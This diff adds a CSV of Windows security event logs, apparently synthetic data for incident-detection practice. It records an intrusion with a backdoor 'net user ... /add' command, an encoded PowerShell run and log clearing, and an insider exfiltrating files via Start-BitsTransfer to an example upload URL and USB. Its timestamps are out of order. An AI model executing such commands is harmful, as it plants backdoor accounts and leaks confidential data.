@@ -1,0 +1,28 @@
+Date,Time,LogLevel,Source,EventID,TaskCategory,Message
+2025-06-27,22:14:05,Information,Security,4624,Logon,A logon was successfully performed using explicit credentials.
+2025-06-27,22:15:42,Warning,Security,4625,Logon,An account failed to log on. Account: admin_backup.
+2025-06-27,22:16:12,Warning,Security,4625,Logon,An account failed to log on. Account: admin_backup.
+2025-06-27,22:17:05,Error,Security,4740,User Account Management,A user account was locked out. Account: admin_backup.
+2025-06-27,22:18:30,Information,Security,4672,Special Logon,Special privileges assigned to new logon. User: JSmith.
+2025-06-27,22:19:02,Warning,Security,4688,Process Creation,A suspicious process was created: powershell.exe -EncodedCommand.
+2025-06-27,22:20:44,Warning,Security,4688,Process Creation,A suspicious process was created: cmd.exe /c net user tempadmin P@ssw0rd! /add.
+2025-06-27,22:21:30,Error,Security,4720,User Account Management,A user account was created. Account: tempadmin.
+2025-06-27,22:23:17,Information,Security,4670,Object Access,Permissions on sensitive file C:\HR\EmployeeData.xlsx were modified.
+2025-06-27,22:24:50,Warning,Security,4663,Object Access,An attempt was made to access an object: C:\HR\EmployeeData.xlsx.
+2025-06-27,22:25:05,Information,Security,4663,Object Access,An attempt was made to access an object: \\Server\Finance\Q3_Budget.xlsx.
+2025-06-27,22:26:22,Critical,Security,1102,Audit Log Cleared,The audit log was cleared by user tempadmin.
+2025-06-27,22:27:30,Error,Schannel,36887,Cryptography,A suspicious TLS connection was attempted to an external IP: 198.51.100.25.
+2025-06-27,22:28:55,Information,Security,4634,Logoff,A user logged off. User: JSmith.
+2025-06-27,09:02:15,Information,Security,4624,Logon,A logon was successfully performed. User: MLopez.
+2025-06-27,09:04:28,Information,Security,4672,Special Logon,Special privileges assigned to new logon. User: MLopez.
+2025-06-27,09:10:43,Information,Security,4663,Object Access,User MLopez accessed confidential file: \\Server\HR\SalaryData.xlsx.
+2025-06-27,09:12:19,Information,Security,4663,Object Access,User MLopez accessed sensitive file: \\Server\Finance\M&A_Proposal.pdf.
+2025-06-27,09:15:33,Warning,Security,4688,Process Creation,User MLopez launched 7zip.exe to compress multiple files.
+2025-06-27,09:17:54,Warning,Security,4688,Process Creation,User MLopez launched powershell.exe to run: Start-BitsTransfer -Source "confidential.zip" -Destination "https://fileshare.example.com/upload".
+2025-06-27,09:19:05,Warning,Security,5156,Filtering Platform Connection,Connection allowed from MLopez to external IP 203.0.113.45 via HTTPS.
+2025-06-27,09:20:20,Information,Security,4634,Logoff,User MLopez logged off.
+2025-06-27,09:35:12,Information,Security,4624,Logon,A logon was successfully performed. User: MLopez.
+2025-06-27,09:36:40,Information,Security,4663,Object Access,User MLopez accessed legal contract draft: \\Server\Legal\Client_Acquisition.docx.
+2025-06-27,09:38:12,Warning,Security,4688,Process Creation,User MLopez copied file to USB drive: E:\Legal\Client_Acquisition.docx.
+2025-06-27,09:39:58,Error,Security,1102,Audit Log Cleared,The audit log was cleared by user MLopez.
+2025-06-27,09:40:10,Information,Security,4634,Logoff,User MLopez logged off.
